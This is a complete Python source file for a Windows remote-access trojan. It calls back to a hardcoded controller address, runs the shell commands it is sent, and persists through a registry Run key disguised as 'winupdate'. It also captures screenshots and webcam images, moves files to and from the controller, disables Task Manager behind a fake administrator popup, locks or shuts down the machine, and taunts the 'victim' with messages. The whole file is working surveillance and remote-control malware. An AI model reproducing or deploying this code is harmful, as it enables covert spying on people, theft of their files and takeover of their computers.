import os
import sys
import cv2
import time
import json
import socket
import ctypes
import base64
import spyware
import subprocess
from winreg import *
import work_manager as wm
from PIL import ImageGrab
from shutil import copyfile

class backdoor:
    PATH = os.path.realpath(sys.argv[0])
    TMP = os.environ["TEMP"]
    APPDATA = os.environ["APPDATA"]
    UPLOADING_SFX_PATH = TMP + "\Music.wav"    

    tm_enabled = True

    try:
        work_manager = wm.manager()
        current_username = spyware.spyware.current_user = os.getlogin()     #Static Variables
        
        hacked_msg_list = ["Brace yourself as pain is crawling towards you.", "{}, You are being controlled by an Indian Scammer!.".format(current_username)]
        troll_msg_list = ["Wake up {}...".format(current_username), "The Matrix has you... ", "Follow the white rabbit.", "Knock, Knock, {}.".format(current_username)]
    except Exception:
        pass

    def __init__(self, ip, port):
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((ip, port))
            except socket.error:
                time.sleep(5)
            else:
                break

    def reliable_send(self, data):
        try:
            json_data = json.dumps(data)
            self.connection.send(json_data.encode())
        except Exception as e:
            return "[-] (Client) Couldn't send the data, {}.".format(e)

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
            except Exception as e:
                return "[-] (Cilent) Couldn't retrieve the data, {}.".format(e)

    def execute_system_command(self, command):
        try:
            DEVNULL = open(os.devnull, 'wb')
            return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL).decode()
        except Exception as e:
            return "[-] Unable to execute system command: {}, {}.".format(command, e)

    def add_to_startup(self, on_startup):
        try:
            app_path = os.path.join(self.APPDATA, os.path.basename(self.PATH))
            if not os.getcwd() == self.APPDATA:
                copyfile(self.PATH, app_path)

            reg_key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
            SetValueEx(reg_key, "winupdate", 0, REG_SZ, app_path)
            CloseKey(reg_key)
        except WindowsError as e:
            if not on_startup:
                return "[-] Unable to add to startup: {}.".format(e)
        else:
            if not on_startup:
                return "[+] Successfully added to startup."

    def remove_from_startup(self):
        try:
            reg_key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
            DeleteValue(reg_key, "winupdate")
            CloseKey(reg_key)
        except FileNotFoundError:
            return "[-] The program is not registered in startup."
        except WindowsError as e:
            return "[-] Error removing value: {}".format(e)
        else:
            return "[+] Successfully removed from startup."

    def show_message_box_popup(self, message):
        try:
            str_script = os.path.join(self.TMP, "m.vbs")

            with open(str_script, "w") as objVBS:
                objVBS.write(f'Msgbox "{message}", vbOKOnly+vbInformation+vbSystemModal, "Message"')
            subprocess.Popen(["cscript", str_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            return "[+] Send the victim the following message: {}.".format(message)
        except Exception as e:
            return "[-] Couldn't send the message: {}, {}.".format(message, e)

    def vbs_block_process(self, process, popup=False):
        strVBSCode = "On Error Resume Next\n" + \
                    "Set objWshShl = WScript.CreateObject(\"WScript.Shell\")\n" + \
                    "Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!//./root/cimv2\")\n" + \
                    "Set colMonitoredProcesses = objWMIService.ExecNotificationQuery(\"select * " \
                    "from __instancecreationevent \" & \" within 1 where TargetInstance isa 'Win32_Process'\")\n" + \
                    "Do" + "\n" + "Set objLatestProcess = colMonitoredProcesses.NextEvent\n" + \
                    f"If LCase(objLatestProcess.TargetInstance.Name) = \"{process}\" Then\n" + \
                    "objLatestProcess.TargetInstance.Terminate\n"
        if popup:
            strVBSCode += f'objWshShl.Popup "{popup[0]}", {popup[2]}, "{popup[1]}", {popup[3]}\n'

        strVBSCode += "End If\nLoop"
        strScript = os.path.join(self.TMP, "d.vbs")

        with open(strScript, "w") as objVBSFile:
            objVBSFile.write(strVBSCode)

        subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                        shell=True)

    def change_tm_state(self):
        global tm_enabled

        try:
            if not self.tm_enabled:
                subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE, shell=True)
            
                self.tm_enabled = True
                return "[+] Task Manager Enabled."
            else:
                popup = ["Task Manager has been disabled by your administrator", "Task Manager", "3", "16"]

                self.vbs_block_process("taskmgr.exe", popup=popup)
                self.tm_enabled = False
                return "[+] Task Manager Disabled."
        except Exception as e:
            return "[-] Couldn't change the State of the Task Manager: {}.".format(e)

    def get_system_information(self):
        try:
            spw = spyware.spyware()
            return spw.get_info()
        except Exception as e:
            return "[-] Could'nt get System Information: {}.".format(e)

    def lock_system(self):
        try:
            ctypes.windll.user32.LockWorkStation()
            return "[+] Successfully locked the system."
        except Exception as e:
            return "[-] Couldn't lock the system: {}.".format(e)

    def shutdown_system(self, shutdown_type):
        try:
            command = f"shutdown {shutdown_type} -f -t 30"
            subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            
            self.connection.close()
            sys.exit(0)
        except Exception as e:
            return "[-] Couldn't shut down the system: {}.".format(e)

    def get_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            path = self.APPDATA + "\SavedScreenshot.png"

            screenshot.save(path)
            data = self.read_file(path)

            self.work_manager.delete_path(path)
            return data
        except Exception as e:
            return "[-] Error getting screenshot data: {}.".format(e)

    def get_webcam_snap(self):
        try:
            cam = cv2.VideoCapture(0)
            
            ret, frame = cam.read()
            path = self.APPDATA + "\\CapturedWebcam.png"
            cv2.imwrite(path, frame)

            file_data = self.read_file(path)
            self.work_manager.delete_path(path)

            cam.release()
            cv2.destroyAllWindows()

            return file_data
        except Exception as e:
            return "[-] Couldn't get a snap of the webcam: {}.".format(e)

    def troll_user(self, msg_list, wait_time):
        for i in range(len(msg_list)):
            self.show_message_box_popup(msg_list[i])
            time.sleep(wait_time)

        self.work_manager.play_sound(self.UPLOADING_SFX_PATH, False)

    def change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return "[+] Changing working directory to: {}.".format(os.getcwd())
        except Exception as e:
            return "[-] Error changing directory to: {}, {}.".format(path, e)

    def get_current_user(self):
        try:
            user = os.getlogin()            
            return "[+] Current user: {}".format(user)
        except Exception as e:
            return "[-] Couldn't get the username: {}".format(e)

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode()
        except Exception as e:
            return "[-] (Client) Error reading from: {}, {}.".format(path, e)

    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
                return "[+] Successfully uploaded to: {}.".format(path)
        except Exception as e:
            return "[-] (Client) Error writing to: {}, {}.".format(path, e)

    def run(self):
        while True:
            command = self.reliable_receive()
            command_0 = str(command[0]).lower()

            rest_of_command = " ".join(command[1:])
            rest_of_command_as_list = rest_of_command.split(" ")

            try:
                if len(rest_of_command) == 0:
                    if command_0 == "exit":     #Exit the program
                        self.connection.close()
                        exit()
                    elif command_0 == "user":
                        command_result = self.get_current_user()
                    elif command_0 == "info":       #Get Info about the system
                        command_result = self.get_system_information()
                    elif command_0 == "tsmanager":      #Change task manager state
                        command_result = self.change_tm_state()                        
                    elif command_0 == "startup":        #Add to startup
                        command_result = self.add_to_startup(False)
                    elif command_0 == "rmstartup":      #Remove from startup
                        command_result = self.remove_from_startup()
                    elif command_0 == "screenshot":     #Get screenshot
                        command_result = self.get_screenshot()
                    elif command_0 == "stsound":      #Stop playing a sound
                        command_result = self.work_manager.play_sound("", True)
                    elif command_0 == "idle":       #Get how much time idle
                        command_result = self.work_manager.get_idle_duration()
                    elif command_0 == "ps":     #List processes
                        command_result = self.work_manager.get_processes()
                    elif command_0 == "webcam":
                        command_result = self.get_webcam_snap()
                    else:       #System command
                        command_result = self.execute_system_command(command)
                else:
                    if command_0 == "cd":   #Change directory
                        command_result = self.change_working_directory_to(rest_of_command)
                    elif command_0 == "download":       #Download a file
                        command_result = self.read_file(rest_of_command)
                    elif command_0 == "upload":     #Upload a file
                        p_index = rest_of_command_as_list.index("-p")
                        t_index = rest_of_command_as_list.index("-t")
                    
                        file_location = " ".join(rest_of_command_as_list[t_index + 1:len(rest_of_command_as_list) - 1])       #What's between -t and the data sent by the server
                        file_name = " ".join(rest_of_command_as_list[p_index + 1:t_index])
                        head, tail = os.path.split(file_name)
                        data = rest_of_command_as_list[-1]
                        
                        path = file_location + "\\" + tail
                        command_result = self.write_file(path, data)
                    elif command_0 == "read":   #Read file's content
                        command_result = self.work_manager.read_content_of_file(rest_of_command)
                    elif command_0 == "psound":     #Stop sound
                        command_result = self.work_manager.play_sound(rest_of_command, False)
                    elif command_0 == "del":    #Delete file\folder
                        command_result = self.work_manager.delete_path(rest_of_command)
                    elif command_0 == "launch":     #Launch file\folder
                        command_0 = self.work_manager.launch_file(rest_of_command)
                    elif command_0 == "cgstate":    #Change state of computer(lock, shutdown)
                        if rest_of_command == "1":
                            command_result = self.lock_system()
                        elif rest_of_command == "2":
                            command_result = self.shutdown_system("-s")
                        elif rest_of_command == "3":
                            command_result = self.shutdown_system("-r")
                        else:
                            command_result = "[-] (Client) No such parameter for cgstate."
                    elif command_0 == "troll":
                        if rest_of_command_as_list[0] != "1" and rest_of_command_as_list[0] != "2":
                            command_result = "[-] (Client) No such parameter for troll."
                        else:
                            if rest_of_command_as_list[0] == "1":
                                self.write_file(self.UPLOADING_SFX_PATH, rest_of_command_as_list[-1])
                                command_result = self.troll_user(self.hacked_msg_list, 5)

                                self.work_manager.delete_path(self.UPLOADING_SFX_PATH)
                            elif rest_of_command_as_list[0] == "2":
                                self.write_file(self.UPLOADING_SFX_PATH, rest_of_command_as_list[-1])
                                command_result = self.troll_user(self.troll_user, 6)

                                self.work_manager.delete_path(self.UPLOADING_SFX_PATH)
                    elif command_0 == "sdmsg":      #Send a message
                        command_result = self.show_message_box_popup(rest_of_command)
                    else:       #System command
                        command_result = self.execute_system_command(command)
            except Exception as e:
                command_result = "[-] (Client) Error during command execution: {}.".format(e)

            self.reliable_send(command_result)

my_backdoor = backdoor("192.168.1.112", 4444)
my_backdoor.run()